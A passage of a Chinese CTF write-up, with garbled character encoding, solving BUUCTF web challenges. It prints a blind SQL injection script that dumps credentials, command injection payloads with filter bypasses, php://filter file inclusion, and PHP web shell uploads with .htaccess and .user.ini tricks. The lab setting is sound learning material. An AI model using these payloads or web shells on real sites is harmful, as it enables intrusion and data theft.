byï¼Œunionå•¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¯•è¯•ç”¨æ‹¬å·å’Œå¼‚æˆ–æ¥è¿›è¡Œä»£æ›¿</p><pre><code>?id=0^(ascii(substr((select(database())),1,1))&gt;2)</code></pre><img src="/2023/08/03/buuctf/172434.png" class=""><p>å¯ä»¥çœ‹åˆ°è¿”å›ç»“æœä¸id&#x3D;1ä¸€æ ·ï¼Œå¯ä»¥æˆåŠŸç»•è¿‡ï¼ŒåŸºäºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è„šæœ¬è¿›è¡Œæ³¨å…¥ï¼š</p><pre><code class="python">import requestsimport timeif __name__ == &#39;__main__&#39; :    url = &#39;http://cf3b0295-5066-4352-aa2b-51ccb07a38c5.node4.buuoj.cn:81/search.php?id=0^&#39;    result = &#39;&#39;    i = 0    while True:        i = i + 1        low = 32        high = 130        while low &lt; high:            mid = (low + high) // 2            #çˆ†åº“å            #payload = f&#39;(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;            #çˆ†è¡¨å                #payload=f&#39;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;geek&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;            #çˆ†å­—æ®µ            #payload = f&#39;(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;geek&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;            #çˆ†æ•°æ®           #payload=f&#39;(ascii(substr((select(group_concat(concat_ws(&quot;~&quot;,username,password)))from(F1naI1y)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;                     r = requests.get(url=url+payload)            time.sleep(0.05)            if &#39;others&#39; in r.text:                low = mid + 1            else:                high = mid        if low!=32:            result += chr(low)        else:            break        print(result) </code></pre><p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯time.sleep()ï¼Œè¯·æ±‚è¿‡å¿«å¯èƒ½ä¸èƒ½å“åº”ï¼Œéœ€è¦åŠ ç‚¹å»¶æ—¶ã€‚</p><h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>æ‰“å¼€åæ˜¯ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œä½†è¾“å…¥ä»€ä¹ˆéƒ½æ²¡ååº”ï¼Œç”¨burpæŠ“åŒ…ï¼š</p><img src="/2023/08/03/buuctf/201609.png" class=""><p>è¿™é‡Œé¢passwordå°±æ˜¯æˆ‘ä»¬ç”¨æˆ·æ¡†ä¸­è¾“å…¥å¾—ä¸œè¥¿ã€‚å¦‚æœé€šè¿‡md5($pass,True)ä¹‹åè¿”å›å­—ç¬¦ä¸²æ˜¯â€™or â€˜1çš„è¯ï¼Œå½¢æˆä¸€ä¸ªæ°¸çœŸæ¡ä»¶:select * from â€˜adminâ€™ where password&#x3D;â€™ â€˜or â€˜6â€¦â€™</p><p>é—®é¢˜æ˜¯è¿™é‡Œçš„md5åŠ ä¸Šå‚æ•°Trueåè¿”å›çš„æ˜¯åŸå§‹16å­—ç¬¦2è¿›åˆ¶æ ¼å¼</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªè„šæœ¬æ¥è·å¾—æ»¡è¶³æˆ‘ä»¬è¦æ±‚çš„æ˜æ–‡ï¼š</p><pre><code>&lt;?php for ($i = 0;;) &#123;  for ($c = 0; $c &lt; 1000000; $c++, $i++)  if (stripos(md5($i, true), &#39;\&#39;or\&#39;&#39;) !== false)   echo &quot;\nmd5($i) = &quot; . md5($i, true) . &quot;\n&quot;; echo &quot;.&quot;;&#125;?&gt;</code></pre><p>è¿™é‡Œæˆ‘ä»¬ç”¨ç½‘ä¸Šå¸¸ç”¨çš„<strong>ffifdyop</strong>ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²ç»è¿‡md5($pass,True)åå°±æ˜¯<code>&#39;or &#39;6...</code></p><p>ä¼ ä¸Šå»åé¡µé¢è·³è½¬åˆ°levels91.phpï¼ŒæŸ¥çœ‹æºä»£ç ï¼š</p><img src="/2023/08/03/buuctf/205543.png" class=""><p>å¼±ç±»å‹æ¯”è¾ƒï¼Œç¬¬ä¸€ç§æ–¹æ³•æ˜¯æ‰¾å‡ºmd5å€¼éƒ½æ˜¯ä¸¤ä¸ª0eå¼€å¤´çš„å¼€å¤´çš„ã€‚åŸç†æ˜¯phpé‡Œé¢åœ¨åš &#x3D;&#x3D; çš„æ—¶å€™ä¼šå…ˆæŠŠä¸¤è¾¹çš„ç±»å‹è½¬æˆä¸€æ ·çš„ï¼Œå› ä¸ºæ˜¯0eå¼€å¤´ï¼Œphpä¼šè®¤ä¸ºå®ƒæ˜¯ç§‘å­¦æŠ€è®¡æ•°æ³•ï¼Œè€Œ0çš„å¤šå°‘æ¬¡æ–¹éƒ½æ˜¯0ã€‚è¿™æ ·çš„å­—ç¬¦ç½‘ä¸Šæœ‰å¾ˆå¤š</p><pre><code>s878926199as155964671a240610708UYXFLOI</code></pre><p>ç¬¬äºŒç§æ–¹æ³•æ˜¯ç”¨æ•°ç»„ç»•è¿‡ï¼š</p><pre><code>?a[]=1&amp;b[]=2</code></pre><p>ä¼ å‚ååˆè·³è½¬åˆ°levell14.php</p><img src="/2023/08/03/buuctf/210632.png" class=""><p>è¿™é‡Œæ˜¯å¼ºç±»å‹æ¯”è¾ƒï¼Œå°±åªèƒ½ç”¨æ•°ç»„ç»•è¿‡ï¼ˆ&#x3D;&#x3D;&#x3D;è¦æ±‚å€¼å’Œç±»å‹éƒ½ç›¸åŒï¼Œè²Œä¼¼å½“ç±»å‹ä¸ºstringæ—¶ï¼Œè¿˜è¦æ¯”è¾ƒå­—ç¬¦ä¸²æ˜¯å¦ä¸€æ‘¸ä¸€æ ·ï¼‰</p><pre><code>param1[]=1&amp;param2[]=2</code></pre><h1 id="å‘½ä»¤æ‰§è¡Œ-rce"><a href="#å‘½ä»¤æ‰§è¡Œ-rce" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ(rce)"></a>å‘½ä»¤æ‰§è¡Œ(rce)</h1><h3 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h3><p>å…ˆæµ‹ç›®å½•ï¼Œå‘ç°åœ¨æ ¹ç›®å½•æœ‰flagæ–‡ä»¶</p><pre><code>target=127.0.0.1;ls ../../../</code></pre><img src="/2023/08/03/buuctf/101305.png" class=""><p>æŸ¥çœ‹æ–‡ä»¶ï¼Œçˆ†å‡ºflag</p><pre><code>target=127.0.0.1;cat ../../../flag</code></pre><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>è¿›å»æœ‰ä¸ªæç¤º&#x2F;?ipï¼Œgetä¸€ä¸‹å‘ç°å’Œå‰é¢ä¸€é“é¢˜å·®ä¸å¤š</p><p>å‘½ä»¤è”åˆæ‰§è¡Œï¼š</p><pre><code>;     å‰é¢çš„æ‰§è¡Œå®Œæ‰§è¡Œåé¢çš„|     ç®¡é“ç¬¦ï¼Œä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤çš„å‚æ•°ï¼ˆæ˜¾ç¤ºåé¢çš„æ‰§è¡Œç»“æœï¼‰         ||    å½“å‰é¢çš„æ‰§è¡Œå‡ºé”™æ—¶ï¼ˆä¸ºå‡ï¼‰æ‰§è¡Œåé¢çš„&amp;     å°†ä»»åŠ¡ç½®äºåå°æ‰§è¡Œ&amp;&amp;    å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ%0a  ï¼ˆæ¢è¡Œï¼‰%0d  ï¼ˆå›è½¦ï¼‰</code></pre><p>é€šé…ç¬¦ï¼š</p><pre><code>*#åŒ¹é…å…¨éƒ¨å­—ç¬¦ï¼Œé€šé…ç¬¦?#ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œé€šé…ç¬¦[]#è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ï¼ˆæ­£åˆ™ï¼Œé€šé…ç¬¦ï¼‰&#123;&#125;#äº§ç”Ÿä¸€ä¸ªåºåˆ—ï¼ˆé€šé…ç¬¦ï¼‰</code></pre><p>lså°±å‘ç°äº†flag.phpå’Œindex.phpï¼Œä½†æµ‹è¯•äº†ä¸€ä¸‹å¾ˆå¤šä¸œè¥¿éƒ½è¢«è¿‡æ»¤äº†ï¼Œç©ºæ ¼åªèƒ½ç”¨$IFS$1ç»•è¿‡ï¼Œflagä¹Ÿè¢«banäº†ï¼Œæˆ‘ä»¬æ¥å°è¯•ä¸€ä¸‹index.php:</p><img src="/2023/08/03/buuctf/103747.png" class=""><pre><code>æ€»ç»“è¿‡æ»¤çš„ç‰¹æ®Šå­—ç¬¦&amp; / ï¼Ÿ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#39; &quot; \ () [] &#123;&#125;  ç©ºæ ¼&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </code></pre><p>1ã€å˜é‡æ›¿æ¢</p><pre><code>?ip=127.0.0.1;b=g;cat$IFS$1fla$b.php//è¿™é‡Œçš„å˜é‡æ›¿æ¢é¡ºåºè¦æ³¨æ„ï¼Œä¸ç„¶åˆè¢«è´ªå©ªåŒ¹é…banäº†</code></pre><p>2ã€å˜é‡abäº’æ¢ä¼ é€’ï¼Œç»•è¿‡å­—ç¬¦ä¸²åŒ¹é…ï¼Œå®ç°æ‹¼æ¥</p><pre><code>?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</code></pre><p>3ã€å†…è”æ‰§è¡Œ</p><pre><code>?ip=127.0.0.1;cat$IFS`ls`?ip=127.0.0.1;cat$IFS$3`ls`</code></pre><p>4ã€è¢«è¿‡æ»¤çš„bashï¼Œç”¨ç®¡é“+shæ›¿æ¢</p><pre><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  //cat flag.phpç”¨base64åŠ å¯†æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash //bashè¢«banäº†</code></pre><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h3><p>è¿™é“é¢˜åªæœ‰ä¸€ä¸ªeval($_POST[â€œSycâ€]);ï¼Œå¯ä»¥ç›´æ¥ç”¨èšå‰‘è¿æ¥</p><h3 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h3><p>è¿™é“é¢˜ç›®åœ¨ä¸€å¼€å§‹å°±æ˜¯ä¸€ä¸ªç©ºç™½çš„å•çº¯é¡µé¢ï¼Œä½†æ˜¯ä½ ç»è¿‡ç›®å½•æ‰«æçš„è¯å°±ä¼šå‘ç°ä¸€ä¸ª.gitæ–‡ä»¶</p><p>{ % asset_img 224106.png%}</p><p>è¿™é‡Œæ˜¯gitæºç æ³„éœ²ï¼Œå¯ä»¥ç”¨githackæŠŠä»–æå‡ºæ¥</p><p>å¾—åˆ°ä¸€ä¸ªindex.php</p><img src="/2023/08/03/buuctf/224448.png" class=""><h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h3 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h3><p>è¿›å»ä¹‹åå‘ç°æœ‰ä¸ªtipsé“¾æ¥ï¼Œç‚¹å‡»é“¾æ¥å‘ç°æ˜¯ä¸€ä¸ªgetä¼ å‚ï¼Œå‚æ•°ä¸­ä¹Ÿæç¤ºäº†flag.php</p><p>ç›´æ¥åœ¨geté‡Œé¢ä¼ å‚ï¼Œç”¨php:&#x2F;&#x2F;filteråè®®ï¼š</p><pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>base64è§£ç åæœç„¶æœ‰flagã€‚</p><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>çœ‹æºä»£ç æç¤ºæˆ‘ä»¬æœ‰ä¸ªsource.phpï¼Œè¿›å…¥åçœ‹æºç ï¼š</p><img src="/2023/08/03/buuctf/221220.png" class=""><p>ç„¶åçœ‹åˆ°æç¤ºhint.phpï¼Œè®¿é—®åå¾—åˆ°flagåœ¨ffffllllaaaaggggä¸‹ï¼Œç„¶åå¼€å§‹å®¡è®¡ä¸€æ³¢ä»£ç ã€‚</p><p>é¦–å…ˆå®ƒå…ˆåˆ¤å®šäº†ä¼ å…¥çš„æ˜¯ä¸æ˜¯ç©ºæˆ–è€…æ˜¯ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œç„¶åè¿›è¡Œäº†ä¸‰æ¬¡ç™½åå•åˆ¤æ–­ã€‚é‡Œé¢æ¶‰åŠåˆ°mb_substr(),mb_strpos(),urldecode()ä¸‰ä¸ªå‡½æ•°ã€‚</p><p>**mb_substr(str,start,length,encoding):**è¿”å›ä»startä½ç½®å¼€å§‹çš„é•¿åº¦ä¸ºlengthçš„å­—ç¬¦ä¸²ã€‚</p><p>**mb_strpos(str,find_str,offset,encoding):**è¿”å›strä¸­ä»offset(é»˜è®¤ä¸º0)å¼€å§‹ç¬¬ä¸€æ¬¡å‡ºç°find_strçš„ä½ç½®ã€‚</p><p>æ ¹æ®ä»£ç åˆ†æå¾—åˆ°ï¼Œåœ¨ç¬¬ä¸€æ¬¡$_pageå–çš„æ˜¯ä»0å¼€å§‹åˆ°ç¬¬ä¸€æ¬¡å‡ºç°ï¼Ÿä¹‹é—´çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å‚æ•°ä¸­ä¼ å…¥ä¸€ä¸ªï¼Ÿç»•è¿‡ç™½åå•ã€‚</p><pre><code>payload:http://03b2cc85-7af4-439b-a06e-41da80ff6505.node3.buuoj.cn/index.php?file=hint.php?../../../../../ffffllllaaaagggg </code></pre><p>tips:includeå‡½æ•°æœ‰è¿™ä¹ˆä¸€ä¸ªç¥å¥‡çš„åŠŸèƒ½ï¼šä»¥å­—ç¬¦â€˜&#x2F;â€™åˆ†éš”ï¼ˆè€Œä¸”ä¸è®¡ä¸ªæ•°ï¼‰ï¼Œè‹¥æ˜¯åœ¨å‰é¢çš„å­—ç¬¦ä¸²æ‰€ä»£è¡¨çš„æ–‡ä»¶æ— æ³•è¢«PHPæ‰¾åˆ°ï¼Œåˆ™PHPä¼šè‡ªåŠ¨åŒ…å«â€˜&#x2F;â€™åé¢çš„æ–‡ä»¶â€”â€”æ³¨æ„æ˜¯æœ€åä¸€ä¸ªâ€˜&#x2F;â€™ã€‚</p><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h3><p>è¿™é“é¢˜å¾ˆçš®</p><p>æ‰“å¼€é¢˜ç›®è¯´â€œä½ æƒ³çŸ¥é“è’‹ç’æºçš„ç§˜å¯†ä¹ˆï¼Ÿâ€ï¼Œå…ˆçœ‹æºç ï¼Œæœ‰ä¸ªArchive_room.phpï¼Œè¿›å»ä¹‹ååˆæœ‰ä¸ªSECRETï¼Œç‚¹å‡»ä¹‹åè·³è½¬åˆ°æ–°é¡µé¢ï¼Œæ˜¾ç¤ºâ€œæŸ¥é˜…ç»“æŸæ²¡çœ‹æ¸…ä¹ˆï¼Ÿå›å»å†ä»”ç»†çœ‹çœ‹å§â€ï¼Œæˆ‘ä»¬è¯•è¯•é€€å›åˆ°ä¸Šä¸€æ­¥ç„¶åæŠ“åŒ…ï¼Œæœç„¶èƒ½æŠ“åˆ°ä¸œè¥¿ï¼š</p><img src="/2023/08/03/buuctf/193820.png" class=""><p>è®¿é—®secr3t.php</p><img src="/2023/08/03/buuctf/194100.png" class=""><p><strong>strstr(string <code>$haystack</code>, string <code>$needle</code>, bool <code>$before_needle</code> &#x3D; <code>false</code>): string|false</strong></p><p>è¿”å› <code>haystack</code> å­—ç¬¦ä¸²ä» <code>needle</code> ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®å¼€å§‹åˆ° <code>haystack</code> ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚</p><p>è¯¥å‡½æ•°åŒºåˆ†å¤§å°å†™ã€‚å¦‚æœæƒ³è¦ä¸åŒºåˆ†å¤§å°å†™ï¼Œè¯·ä½¿ç”¨ stristr()ã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿‡æ»¤è§„åˆ™å¾ˆç®€å•ï¼Œè€Œä¸”æç¤ºçš„flag.phpæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œé‚£æˆ‘ä»¬åº”è¯¥ä¼šæƒ³åˆ°flagåº”è¯¥ä¸ä¼šåœ¨flag.phpé‡Œï¼Œä½†å…ˆåŒ…å«flag.phpçœ‹çœ‹</p><img src="/2023/08/03/buuctf/194620.png" class=""><p>æ²¡æ˜¾ç¤ºflag,æˆ‘å°±åœ¨è¿™é‡Œã€‚ã€‚ã€‚å¯èƒ½flagè¢«å½“ä½œå˜é‡äº†,ç”¨php:&#x2F;&#x2F;filterçœ‹çœ‹</p><pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p>è§£ç åå‡ºç°äº†flagå˜é‡</p><h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><p>ä¸»é¡µä¸Šæœ‰WOOFERSå’ŒMEOWERSä¸¤ä¸ªé€‰é¡¹ï¼Œç‚¹å‡»åå‘ç°urlè·Ÿç€å˜åŒ–ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯sqlæ³¨å…¥ï¼Œè¯•äº†ä¸€ä¸‹?category&#x3D;woofersâ€œ</p><img src="/2023/08/03/buuctf/174823.png" class=""><p>æœ‰include()ï¼ŒåŸæ¥æ˜¯æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°ï¼Œå®ƒè‡ªåŠ¨åŠ ä¸Šäº†.phpï¼Œæˆ‘ä»¬è¯•ä¸€ä¸‹è®©å®ƒåŒ…å«flagï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°â€Sorry, we currently only support woofers and meowersâ€œ</p><p>è¯•ä¸€ä¸‹?category&#x3D;woofers&#x2F;..&#x2F;flagï¼š</p><p>{ % asset_img 175749.png%}</p><p>å¯ä»¥çœ‹åˆ°ï¼Œflag.phpåº”è¯¥æ˜¯è¢«åŒ…å«äº†è¿›å»ï¼Œä½†flagæ²¡æœ‰æ˜¾ç¤ºï¼Œå¯èƒ½æ˜¯æ²¡æœ‰è¾“å‡ºæˆ–è€…è¢«æ³¨é‡Šäº†</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¥—ç”¨ä¼ªåè®®ï¼š</p><pre><code>?category=php://filter/convert.base64-encode/woofers/resource=flag</code></pre><h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h3><p>é€šè¿‡æµ‹è¯•å‘ç°è¿™é“é¢˜æ£€æµ‹äº†æ–‡ä»¶åç¼€ï¼Œæ–‡ä»¶ç±»å‹å’Œæ–‡ä»¶å†…å®¹ã€‚</p><p>æ–‡ä»¶åç¼€æˆ‘ä»¬ç”¨.phtmlç»•è¿‡ï¼Œæ–‡ä»¶ç±»å‹æˆ‘ä»¬ä¿®æ”¹ä¸ºContent-Typeï¼šimage&#x2F;jpegï¼Œæ–‡ä»¶å†…å®¹å®ƒæ£€æµ‹åˆ°äº†â€&lt;?â€,å¯ä»¥ç”¨&lt;script language&#x3D;â€phpâ€&gt;eval($_POST[shell])&lt;&#x2F;script&gt;ç»•è¿‡ï¼Œè¿˜éœ€è¦åŠ ä¸Šæ–‡ä»¶å¤´GIF89a</p><img src="/2023/08/03/buuctf/210543.png" class=""><h3 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h3><p>ä¸Šæ¥å°±æ˜¯ä¸€ä¸ªå‰ç«¯jséªŒè¯ï¼ŒburpæŠ“åŒ…ä¿®æ”¹åç¼€ï¼š</p><img src="/2023/08/03/buuctf/215809.png" class=""><p>å‘ç°responseæ˜¯nonono bad fileï¼Œè¯•è¯•.phtmlåç¼€</p><img src="/2023/08/03/buuctf/220018.png" class=""><p>æˆåŠŸ</p><h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>è¿™é“é¢˜å¾ˆè¿·ï¼Œæµ‹äº†å¾ˆå¤šä¸œè¥¿éƒ½è¿‡ä¸å»ï¼Œç”šè‡³æœ€åæµ‹ä¸€å¼ æ™®é€šçš„å›¾ç‰‡éƒ½è¿‡ä¸å»ï¼Œæœ€åæ‰åœ¨æºä»£ç ä¸­å‘ç°å¯¹ä¸Šä¼ å†…å®¹é•¿åº¦æœ‰é™åˆ¶ï¼š$_FILES[â€œuploadedâ€][â€œsizeâ€] &lt; 2048ã€‚</p><p>é‚£ä¹ˆé‡æ–°æŒ‰å¸¸è§„æ€è·¯èµ°ï¼š</p><p>é¦–å…ˆä¿®æ”¹content-Typeå¿…é¡»ä¸ºimage&#x2F;jpegæ‰å¯ä»¥ï¼Œç„¶åå‘ç°åç¼€åä¹Ÿä¸èƒ½å«æœ‰phï¼Œ</p><img src="/2023/08/03/buuctf/225239.png" class=""><p>è¿˜æ˜¯ä¸è¡Œï¼Œä¿®æ”¹ä¸€å¥è¯ä¸º&lt;script language&#x3D;â€phpâ€&gt;eval($_REQUEST[shell])&lt;&#x2F;script&gt;æˆåŠŸç»•è¿‡ã€‚</p><p>æ—¢ç„¶åªä¸Šä¼ äº†ä¸€ä¸ªjpgæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿˜éœ€è¦ä¸Šä¼ ä¸€ä¸ª.htaccess</p><p>.htaccessçš„æ–¹æ³•ï¼š</p><pre><code>æ–¹æ³•ä¸€ï¼šåªå°†â€œhaha.pngâ€æ–‡ä»¶å½“æˆphpæ–‡ä»¶æ‰§è¡Œ&lt;FilesMatch &quot;haha.png&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;æ–¹æ³•äºŒï¼šè¿™é‡Œæ—¶æ˜¯è¦åŒ…å«æ‰€æœ‰æ–‡ä»¶å¸¦æœ‰hahaçš„æ–‡ä»¶ï¼ˆåªè¦æ–‡ä»¶åé‡Œé¢æœ‰hahaéƒ½å¯ä»¥ï¼‰ï¼Œéƒ½ä¼šè¢«å½“æˆphpä»£ç æ‰§è¡Œ&lt;FilesMatch &quot;haha&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;æ–¹æ³•ä¸‰ï¼šè¿™ç§æ–¹æ³•æ—¶ï¼Œåé¢çš„.pngæˆ–è€….jpgæ–‡ä»¶èƒ½è¢«å½“æˆphpä»£ç æ‰§è¡Œï¼Œå¦‚æœæƒ³æ¢æˆåˆ«çš„æ”¹æ‰©å±•åå°±å¯ä»¥AddType application/x-httpd-php .pngAddType application/x-httpd-php .jpg</code></pre><p>æœ€åå¯ä»¥ä½¿ç”¨èšå‰‘è¿æ¥</p><h3 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h3><p>æµ‹äº†ä¸€ä¸‹å‘æœ‰é»‘åå•è¿‡æ»¤å’ŒMIMEä¿¡æ¯è¿‡æ»¤ï¼Œé‚£å°±å¸¸è§„æ“ä½œï¼Œä¸Šä¼ ä¸ªpngæœ¨é©¬ï¼Œå†ä¼ ä¸ª.htaccessæ–‡ä»¶ï¼Œå°†Content-Typeä¿®æ”¹ä¸ºimage&#x2F;pngå°±è¡Œã€‚</p><p>è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é¢˜ç”¨ä¸äº†systemç­‰å‡½æ•°äº†ï¼Œä½†å¯ä»¥ç”¨show_source()ã€‚</p><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>æ‰“å¼€åå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®ï¼Œæˆ‘ä»¬å…ˆä¸Šä¼ ä¸ªä¸€å¥è¯ï¼Œæµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°è¿™é“é¢˜é™åˆ¶äº†æ–‡ä»¶åç¼€ï¼Œæ–‡ä»¶å¤´ï¼Œè¿˜è¿‡æ»¤äº†&lt;?ï¼Œ</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸Šä¼ ä¸€ä¸ª.pngçš„å›¾ç‰‡é©¬ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><pre><code>GIF89a&lt;script language=&quot;php&quot;&gt;eval($_POST[shell])&lt;/script&gt;</code></pre><p>è¿™é“é¢˜æµ‹è¯•äº†ä¸€ä¸‹è™½ç„¶å¯ä»¥æˆåŠŸä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œä½†ä¸èƒ½åˆ©ç”¨ï¼Œå¯èƒ½æ˜¯æ²¡æœ‰å¼€å¯AllowOverride Allï¼Œæ‰€ä»¥åªèƒ½ä½¿ç”¨.user.iniæ–‡ä»¶ï¼ˆå‰ææ˜¯å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ï¼‰</p><pre><code>GIF89aauto_prepend_file=haha.png</code></pre><p>æœ€åéœ€è¦è®¿é—®index.php</p><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><img src="/2023/08/03/buuctf/182338.png" class=""><p>è¿™é“é¢˜çš„é‡ç‚¹åœ¨äºè¿™ä¸¤ä¸ªå‡½æ•°ï¼š</p><pre><code>escapeshellarg()escapeshellcmd()</code></pre><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p><pre><code>escapeshellarg â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°åŠŸèƒ½ ï¼šescapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œshell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦(åå¼•å·)escapeshellcmd â€” shell å…ƒå­—ç¬¦è½¬ä¹‰åŠŸèƒ½ï¼šescapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ 